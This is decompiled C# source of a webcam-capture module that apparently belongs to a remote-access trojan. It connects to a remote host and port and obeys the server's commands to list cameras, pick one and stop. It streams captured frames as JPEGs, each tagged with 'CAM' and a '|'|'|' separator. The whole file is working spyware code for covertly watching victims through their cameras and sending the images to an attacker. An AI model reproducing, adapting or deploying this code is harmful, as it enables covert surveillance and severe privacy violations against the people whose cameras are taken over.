using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using cam.DirectX.Capture;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace cam
{
	// Token: 0x02000002 RID: 2
	public class A
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public A()
		{
			this.OFF = false;
			this.Y = "|'|'|";
			this.OSK = "";
			this.bzy = false;
			this.imgs = new List<Bitmap>();
			this.SZ = 100;
			this.Drive = -1;
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020A4 File Offset: 0x000002A4
		public void Send(byte[] b)
		{
			try
			{
				TcpClient c = this.C;
				lock (c)
				{
					MemoryStream memoryStream = new MemoryStream();
					string text = Conversions.ToString(b.Length) + "\0";
					byte[] array = this.SB(ref text);
					memoryStream.Write(array, 0, array.Length);
					memoryStream.Write(b, 0, b.Length);
					this.C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
					memoryStream.Dispose();
				}
			}
			catch (Exception ex)
			{
				this.OFF = true;
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x0000215C File Offset: 0x0000035C
		public void Send(string S)
		{
			this.Send(this.SB(ref S));
		}

		// Token: 0x06000004 RID: 4 RVA: 0x0000216C File Offset: 0x0000036C
		public byte[] SB(ref string S)
		{
			return Encoding.Default.GetBytes(S);
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002188 File Offset: 0x00000388
		public string BS(ref byte[] B)
		{
			return Encoding.Default.GetString(B);
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000021A4 File Offset: 0x000003A4
		public void Start()
		{
			string[] array = this.Divs();
			if (array == null)
			{
				this.OFF = true;
				return;
			}
			if (array.Length == 0)
			{
				this.OFF = true;
				return;
			}
			Thread thread = new Thread(new ThreadStart(this.RC));
			thread.Start();
			thread = new Thread(new ThreadStart(this.Sender));
			thread.Start();
			while (!this.OFF)
			{
				Application.DoEvents();
				Thread.Sleep(10);
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x0000221C File Offset: 0x0000041C
		public void RC()
		{
			MemoryStream memoryStream = new MemoryStream();
			this.C = new TcpClient();
			byte[] array = new byte[1];
			long num = -1L;
			checked
			{
				try
				{
					this.C.Client.SendTimeout = -1;
					this.C.Client.ReceiveTimeout = -1;
					this.C.Client.SendBufferSize = 102400;
					this.C.Connect(this.H, this.P);
					string text = "~";
					this.ind(this.SB(ref text));
					IL_80:
					while (!this.OFF)
					{
						this.C.Client.Poll(-1, SelectMode.SelectRead);
						while (this.C.Available != 0)
						{
							if (num == -1L)
							{
								string text2 = "";
								for (;;)
								{
									int num2 = this.C.GetStream().ReadByte();
									if (num2 == -1)
									{
										goto Block_9;
									}
									if (num2 == 0)
									{
										break;
									}
									text2 += Conversions.ToString(Strings.ChrW(num2));
								}
								num = Conversions.ToLong(text2);
								if (num == 0L)
								{
									this.Send("");
									num = -1L;
								}
								if (this.C.Available > 0)
								{
									continue;
								}
								goto IL_80;
								Block_9:
								break;
							}
							array = new byte[this.C.Available + 1];
							long num3 = num - memoryStream.Length;
							if (unchecked((long)array.Length) > num3)
							{
								array = new byte[(int)(num3 - 1L) + 1];
							}
							int num4 = this.C.Client.Receive(array, 0, array.Length, SocketFlags.None);
							memoryStream.Write(array, 0, num4);
							if (memoryStream.Length == num)
							{
								num = -1L;
								Thread thread = new Thread(delegate(object a0)
								{
									this.ind((byte[])a0);
								}, 1);
								thread.Start(memoryStream.ToArray());
								thread.Join(100);
								memoryStream.Dispose();
								memoryStream = new MemoryStream();
							}
							Thread.Sleep(1);
							goto IL_80;
						}
						break;
					}
				}
				catch (Exception ex)
				{
				}
				this.OFF = true;
				try
				{
					this.C.Client.Disconnect(false);
				}
				catch (Exception ex2)
				{
				}
				try
				{
					this.C.Close();
				}
				catch (Exception ex3)
				{
				}
				try
				{
					memoryStream.Dispose();
				}
				catch (Exception ex4)
				{
				}
				this.close();
			}
		}

		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000008 RID: 8 RVA: 0x000024D0 File Offset: 0x000006D0
		// (set) Token: 0x06000009 RID: 9 RVA: 0x000024E4 File Offset: 0x000006E4
		private protected virtual Capture o
		{
			get
			{
				return this._o;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._o = value;
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000024F0 File Offset: 0x000006F0
		public void Sender()
		{
			checked
			{
				while (!this.OFF)
				{
					Thread.Sleep(1);
					try
					{
						Bitmap bitmap = null;
						List<Bitmap> list = this.imgs;
						lock (list)
						{
							if (this.imgs.Count > 0)
							{
								bitmap = this.imgs[0];
								this.imgs.RemoveAt(0);
							}
						}
						if (bitmap != null)
						{
							MemoryStream memoryStream = new MemoryStream();
							bitmap.Save(memoryStream, ImageFormat.Jpeg);
							MemoryStream memoryStream2 = new MemoryStream();
							string text = string.Concat(new string[] { "CAM", this.Y, this.OSK, this.Y, "!", this.Y });
							byte[] array = this.SB(ref text);
							memoryStream2.Write(array, 0, array.Length);
							memoryStream2.Write(memoryStream.ToArray(), 0, (int)memoryStream.Length);
							this.C.Client.SendBufferSize = (int)(memoryStream2.Length * 3L);
							this.C.Client.Poll(-1, SelectMode.SelectWrite);
							this.Send(memoryStream2.ToArray());
							memoryStream.Dispose();
							memoryStream2.Dispose();
							bitmap.Dispose();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002678 File Offset: 0x00000878
		public void ind(byte[] b)
		{
			string text = this.BS(ref b);
			string[] array = Strings.Split(text, this.Y, -1, CompareMethod.Binary);
			try
			{
				string text2 = array[0];
				if (Operators.CompareString(text2, "~", false) == 0)
				{
					string text3 = string.Concat(new string[] { "CAM", this.Y, this.OSK, this.Y, "~" });
					string[] array2 = this.Divs();
					if (array2 == null)
					{
						this.OFF = true;
					}
					else
					{
						foreach (string text4 in array2)
						{
							text3 = text3 + this.Y + text4;
						}
						this.Send(text3);
					}
				}
				else if (Operators.CompareString(text2, "!", false) == 0)
				{
					this.SZ = Conversions.ToInteger(array[2].Replace("%", ""));
					if (this.Drive != Conversions.ToInteger(array[1]))
					{
						this.onn(Conversions.ToInteger(array[1]));
						this.Send(string.Concat(new string[] { "CAM", this.Y, this.OSK, this.Y, "!", this.Y, "!" }));
					}
				}
				else if (Operators.CompareString(text2, "@", false) == 0)
				{
					this.close();
				}
			}
			catch (Exception ex)
			{
				this.close();
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002834 File Offset: 0x00000A34
		public static ImageCodecInfo GetEncoderInfo(string M)
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			int num = 0;
			int num2 = imageEncoders.Length;
			checked
			{
				for (int i = num; i <= num2; i++)
				{
					if (Operators.CompareString(imageEncoders[i].MimeType, M, false) == 0)
					{
						return imageEncoders[i];
					}
				}
				return null;
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002870 File Offset: 0x00000A70
		public void close()
		{
			try
			{
				this.o.Dispose();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.th.Abort();
			}
			catch (Exception ex2)
			{
			}
			this.th = null;
			this.bzy = false;
			this.Drive = -1;
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000028E4 File Offset: 0x00000AE4
		public string[] Divs()
		{
			List<string> list = new List<string>();
			checked
			{
				string[] array;
				try
				{
					Filters filters = new Filters();
					int num = 0;
					int num2 = filters.VideoInputDevices.Count - 1;
					for (int i = num; i <= num2; i++)
					{
						list.Add(filters.VideoInputDevices[i].Name);
					}
					array = list.ToArray();
				}
				catch (Exception ex)
				{
					array = null;
				}
				return array;
			}
		}

		// Token: 0x0600000F RID: 15 RVA: 0x0000295C File Offset: 0x00000B5C
		public void onn(int i)
		{
			this.close();
			this.Drive = i;
			this.bzy = true;
			Filters filters = new Filters();
			this.o = new Capture(filters.VideoInputDevices[i], null);
			this.o.VideoCompressor = filters.VideoCompressors[0];
			this.o.PreviewWindow = new Panel();
			this.o.FrameEvent2 += this.img;
			this.o.GrapImg();
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000029E8 File Offset: 0x00000BE8
		private void img(Bitmap x)
		{
			checked
			{
				Bitmap bitmap;
				if (this.SZ == 100)
				{
					bitmap = (Bitmap)x.Clone();
				}
				else
				{
					bitmap = new Bitmap((int)Math.Round(unchecked((double)x.Width * ((double)this.SZ / 100.0))), (int)Math.Round(unchecked((double)x.Height * ((double)this.SZ / 100.0))), PixelFormat.Format32bppArgb);
					Graphics graphics = Graphics.FromImage(bitmap);
					Graphics graphics2 = graphics;
					Rectangle rectangle = new Rectangle(Point.Empty, bitmap.Size);
					graphics2.DrawImage(x, rectangle);
					graphics.Dispose();
				}
				List<Bitmap> list = this.imgs;
				lock (list)
				{
					if (this.imgs.Count > 0)
					{
						this.imgs.RemoveAt(0);
					}
					this.imgs.Add(bitmap);
				}
				try
				{
					if (File.Exists(this.o.Filename))
					{
						File.Delete(this.o.Filename);
					}
					x.Dispose();
				}
				catch (Exception ex)
				{
				}
				try
				{
					this.th = Thread.CurrentThread;
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x04000001 RID: 1
		public string H;

		// Token: 0x04000002 RID: 2
		public int P;

		// Token: 0x04000003 RID: 3
		public bool OFF;

		// Token: 0x04000004 RID: 4
		public string Y;

		// Token: 0x04000005 RID: 5
		public TcpClient C;

		// Token: 0x04000006 RID: 6
		public string OSK;

		// Token: 0x04000007 RID: 7
		[AccessedThroughProperty("o")]
		private Capture _o;

		// Token: 0x04000008 RID: 8
		public bool bzy;

		// Token: 0x04000009 RID: 9
		private List<Bitmap> imgs;

		// Token: 0x0400000A RID: 10
		public int SZ;

		// Token: 0x0400000B RID: 11
		public int Drive;

		// Token: 0x0400000C RID: 12
		private Thread th;
	}
}
